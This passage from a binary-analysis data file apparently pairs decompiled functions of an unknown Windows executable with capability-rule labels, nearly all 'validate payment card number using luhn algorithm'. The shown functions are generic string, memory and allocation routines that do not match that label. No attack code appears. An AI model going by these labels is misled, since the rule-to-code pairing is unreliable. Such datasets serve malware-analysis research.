(iVar3 = *(arg_8h + 0x11) - *(arg_ch + 0x11),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x12) - *(arg_ch + 0x12),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[5] != arg_ch[5]) {\n                        iVar3 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x15) - *(arg_ch + 0x15),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x16) - *(arg_ch + 0x16),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[6] != arg_ch[6]) {\n                        iVar3 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x19) - *(arg_ch + 0x19),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[7] != arg_ch[7]) {\n                        iVar3 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    arg_10h = arg_10h - 0x20;\n                    arg_8h = arg_8h + 8;\n                    arg_ch = arg_ch + 8;\n                } while (0x1f < arg_10h);\n            }\n    // WARNING: Could not recover jumptable at 0x0048577b. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (32 cases) at 0x4862c5\n            iVar3 = (**(arg_10h * 4 + 0x4862c5))();\n            return iVar3;\n        }\n        iVar3 = *arg_8h - *arg_ch;\n        if (((iVar3 != 0) || (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 != 0)) ||\n           (iVar3 = *(arg_8h + 2) - *(arg_ch + 2),  iVar3 != 0)) {\ncode_r0x0048623f:\n            return (0 < iVar3) * 2 + -1;\n        }\n        uVar2 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n    }\n    iVar3 = uVar2 - uVar1;\n    if (iVar3 != 0) {\n        iVar3 = (0 < iVar3) * 2 + -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 2329
    },
    "004020f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004020f9(int16_t *arg_8h, int16_t *arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                return arg_8h;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 115
    },
    "0040211c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.0040211c(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h & 0xffff;\n    if (var_8h != 0xffff) {\n        if (var_8h < 0x100) {\n            return *(*0x56ce58 + var_8h * 2) & arg_ch;\n        }\n        var_4h = 0;\n        iVar1 = fcn.004053b7(1, &var_8h, 1, &var_4h);\n        if (iVar1 != 0) {\n            return var_4h & arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "0047a29e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047a29e(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t lpMultiByteStr;\n    uint var_8h;\n    uint var_4h;\n    \n    lpMultiByteStr = arg_ch;\n    if (arg_14h != 0) {\n        do {\n            if (lpMultiByteStr == arg_10h) break;\n            iVar1 = fcn.00403cdd(&var_4h, lpMultiByteStr, arg_10h - lpMultiByteStr, arg_8h, in_ECX + 8);\n            if (iVar1 < 0) break;\n            if (iVar1 == 0) {\n                iVar1 = 1;\n            }\n            lpMultiByteStr = lpMultiByteStr + iVar1;\n            arg_14h = arg_14h + -1;\n        } while (arg_14h != 0);\n    }\n    return lpMultiByteStr - arg_ch;\n}\n",
        "token_count": 248
    },
    "00402185": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402185(code *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = in_ECX + 4;\n    for (; in_ECX != iVar1; in_ECX = in_ECX + 4) {\n        (**0x573000)(in_ECX);\n        (*arg_8h)();\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "004021b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004021b7(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402ad6();\n    return iVar1 + 0x10;\n}\n",
        "token_count": 45
    },
    "0048fab5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048fab5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00402de2(arg_8h, arg_ch, *(in_ECX + 4), *(in_ECX + 8));\n    return;\n}\n",
        "token_count": 67
    },
    "0047a0cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047a0cf(int32_t arg_8h, int32_t arg_ch)\n\n{\n    fcn.004028b0(0x811c9dc5, arg_8h, arg_ch - arg_8h & 0xfffffffe);\n    return;\n}\n",
        "token_count": 66
    },
    "00402257": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402257(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.004063f2(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 224
    },
    "0047c56a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0047c56a(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    *arg_14h = arg_ch;\n    uVar1 = *arg_8h;\n    arg_8h_00 = arg_8h[1];\n    iVar2 = fcn.00401f91(&var_ch, 0, arg_8h, in_ECX + 8);\n    if (0 < iVar2) {\n        iVar2 = iVar2 + -1;\n        if (arg_10h - *arg_14h < iVar2) {\n            *arg_8h = uVar1;\n            arg_8h[1] = arg_8h_00;\n        }\n        else if (0 < iVar2) {\n            fcn.0040576d(*arg_14h, &var_ch, iVar2);\n            *arg_14h = *arg_14h + iVar2;\n        }\n    }\n    fcn.00403085(arg_8h_00);\n    return;\n}\n",
        "token_count": 345
    },
    "0040229d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040229d(uint8_t *arg_8h, int32_t **arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    piVar2 = *arg_ch;\n    uVar3 = *arg_8h;\n    if (*(uVar3 + piVar2[0x25]) != 'e') {\n        do {\n            uVar3 = arg_8h[1];\n            arg_8h = arg_8h + 1;\n        } while ((*(*piVar2 + uVar3 * 2) & 4) != 0);\n    }\n    if (*(uVar3 + piVar2[0x25]) == 'x') {\n        uVar3 = arg_8h[2];\n        arg_8h = arg_8h + 2;\n    }\n    *arg_8h = **piVar2[0x22];\n    do {\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n        *arg_8h = uVar3;\n        bVar4 = uVar3 != 0;\n        uVar3 = uVar1;\n    } while (bVar4);\n    return;\n}\n",
        "token_count": 291
    },
    "0040236a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040236a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.004041a1();\n    iVar1 = fcn.00406190(in_ECX + 8, arg_8h);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "004023a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004023a1(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b246e(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "0047a0a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047a0a6(int32_t arg_8h, int32_t arg_ch)\n\n{\n    fcn.004028b0(0x811c9dc5, arg_8h, arg_ch - arg_8h & 0xfffffffe);\n    return;\n}\n",
        "token_count": 67
    },
    "0047b208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0047b208(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_24h = fcn.004054ed(&var_44h, 0x40, 0x54d9e4, arg_1ch);\n    fcn.00406041(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.00403085(var_44h);\n    return;\n}\n",
        "token_count": 209
    },
    "004023bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004023bf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004c44c4(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "004023fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004023fb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004021c1(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "00402450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402450(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.0040355d(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004043b8(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00401d61(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00401d61(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 438
    },
    "0040248c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040248c(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg_8h;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    fcn.00401163(arg_8h, piVar2 - (arg_8h + 1) >> 1);\n    return;\n}\n",
        "token_count": 115
    },
    "00402491": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402491(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00403337(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 193
    },
    "004024c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004024c8(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00401bd1(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "004024fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024fa(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00404d27(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00402577": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00402577(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 66
    },
    "0040262b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0040262b(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    if ((param_4 | param_2) == 0) {\n        return param_1 * param_3;\n    }\n    return param_1 * param_3 & 0xffffffff | (param_1 * param_3 >> 0x20) + param_2 * param_3 + param_1 * param_4 << 0x20;\n}\n",
        "token_count": 119
    },
    "004026f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004026f8(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *arg_ch,  uVar1 != 0; arg_ch = arg_ch + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n        uVar1 = *arg_8h;\n        if (uVar1 == 0) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while ((*(&uStack40 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0);\n    return iVar3;\n}\n",
        "token_count": 343
    },
    "00402725": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402725(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004034cc(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 81
    },
    "004027ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004027ac(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    fcn.004035b2();\n    return in_ST0;\n}\n",
        "token_count": 112
    },
    "004027e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004027e3(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.004063f2(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 191
    },
    "00402801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402801(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004034cc(arg_8h, arg_8h + 0x1a, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 81
    },
    "0040291e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040291e(uint32_t arg_8h, uint noname_1, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t arg_ch;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - iVar2) {\n        arg_ch = in_ECX[5];\n        iVar4 = fcn.0040566e(iVar2 + arg_8h, arg_ch, 0x7fffffff);\n        iVar5 = fcn.00406000(iVar4 + 1);\n        in_ECX[4] = iVar2 + arg_8h;\n        iVar1 = iVar2 + iVar5;\n        in_ECX[5] = iVar4;\n        if (arg_ch < 0x10) {\n            fcn.0040576d(iVar5);\n            fcn.0040576d(iVar1, arg_10h, arg_14h);\n            *(arg_14h + iVar1) = 0;\n        }\n        else {\n            iVar4 = *in_ECX;\n            fcn.0040576d(iVar5, iVar4, iVar2);\n            fcn.0040576d(iVar1, arg_10h, arg_14h);\n            *(arg_14h + iVar1) = 0;\n            fcn.00401659(iVar4, arg_ch + 1);\n        }\n        *in_ECX = iVar5;\n        return;\n    }\n    fcn.004038aa();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 422
    },
    "0040292d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040292d(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = arg_8h;\n    if (arg_8h == 0) goto code_r0x004af4d0;\n    if (arg_10h == 4) {\ncode_r0x004af4f6:\n        if ((arg_10h != 0) && (arg_10h != 0x40)) goto code_r0x004af50c;\n    }\n    else if (arg_10h != 0) {\n        if (arg_10h != 0x40) goto code_r0x004af4d0;\n        goto code_r0x004af4f6;\n    }\n    if (0x7ffffffd < arg_14h - 2U) {\ncode_r0x004af4d0:\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0xffffffff;\n    }\ncode_r0x004af50c:\n    var_20h = &arg_14h;\n    var_ch = arg_8h;\n    var_1ch = &var_8h;\n    var_18h = &arg_10h;\n    var_14h = &arg_ch;\n    var_10h = arg_8h;\n    uVar2 = fcn.004af2af(&var_10h, &var_20h);\n    return uVar2;\n}\n",
        "token_count": 450
    },
    "0047a387": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047a387(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h, uchar *arg_14h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00403161(*arg_8h, arg_10h);\n            *arg_14h = uVar1;\n            arg_8h = arg_8h + 1;\n            arg_14h = arg_14h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 149
    },
    "0047ba8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.0047ba8f(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00406843(in_ECX, &var_ch, 0x54d9ec, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch, arg_20h);\n    fcn.004030df(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 258
    },
    "0040297d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040297d(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        fcn.004040d9(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 59
    },
    "004029a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004029a0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        fcn.0040291e(arg_ch, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004058f3(in_ECX + iVar1, arg_8h, arg_ch);\n        *(in_ECX + iVar1 + arg_ch) = 0;\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "004029a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004029a5(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    fcn.004040d9(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 93
    },
    "004029f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004029f5(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_14h);\n    fcn.0040314d(arg_14h + arg_8h, arg_1ch, arg_18h);\n    fcn.0040576d(arg_14h + arg_8h + arg_18h, arg_ch + arg_14h, (arg_10h - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 155
    },
    "00418a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
